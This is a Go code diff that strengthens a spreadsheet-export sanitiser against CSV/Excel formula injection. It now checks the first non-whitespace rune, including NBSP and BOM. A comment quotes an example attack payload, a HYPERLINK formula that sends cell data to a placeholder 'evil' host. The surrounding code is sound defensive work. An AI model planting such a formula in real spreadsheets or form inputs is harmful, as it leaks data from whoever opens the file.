@@ -112,18 +112,45 @@ func extractAndFormat(col columnConfig, app dataexport.ApplicationSnapshot) stri
 }
 
 // sanitiseSpreadsheetValue defangs CSV/Excel-injection vectors. Values
-// starting with '=', '+', '-', '@', TAB or CR are interpreted as formulas
-// by Excel/LibreOffice; a leading apostrophe forces literal-text rendering.
-// See OWASP "CSV Injection". Applied uniformly to XLSX and CSV output so a
-// hostile member name like `=HYPERLINK("http://evil/?"&A2)` becomes a
-// harmless cell value when the admin opens the export.
+// whose first non-whitespace rune is '=', '+', '-', '@', TAB or CR are
+// interpreted as formulas by Excel/LibreOffice; a leading apostrophe
+// forces literal-text rendering. See OWASP "CSV Injection". Applied
+// uniformly to XLSX and CSV output so a hostile member name like
+// `=HYPERLINK("http://evil/?"&A2)` becomes a harmless cell value when
+// the admin opens the export.
+//
+// LibreOffice's "Detect special numbers" import mode trims leading
+// whitespace before formula detection, and NBSP (U+00A0) / BOM (U+FEFF)
+// also slip through naive byte-0 checks. We therefore look at the first
+// non-whitespace rune and treat the original string as dangerous if that
+// rune is in the trigger set, regardless of any leading padding.
 func sanitiseSpreadsheetValue(s string) string {
 	if s == "" {
 		return s
 	}
-	switch s[0] {
-	case '=', '+', '-', '@', '\t', '\r':
-		return "'" + s
+	for _, r := range s {
+		if isSpreadsheetWhitespace(r) {
+			continue
+		}
+		switch r {
+		case '=', '+', '-', '@', '\t', '\r':
+			return "'" + s
+		}
+		return s
 	}
+	// All-whitespace string — harmless, leave untouched.
 	return s
+}
+
+// isSpreadsheetWhitespace covers the chars Excel/LibreOffice trim during
+// import BEFORE formula detection: ASCII space, LF, NBSP (U+00A0),
+// BOM (U+FEFF). TAB and CR are NOT in this set \u2014 they are formula
+// triggers themselves (DDE in legacy Excel), so a leading TAB/CR must
+// defang, not be skipped over.
+func isSpreadsheetWhitespace(r rune) bool {
+	switch r {
+	case ' ', '\n', '\u00a0', '\ufeff':
+		return true
+	}
+	return false
 }
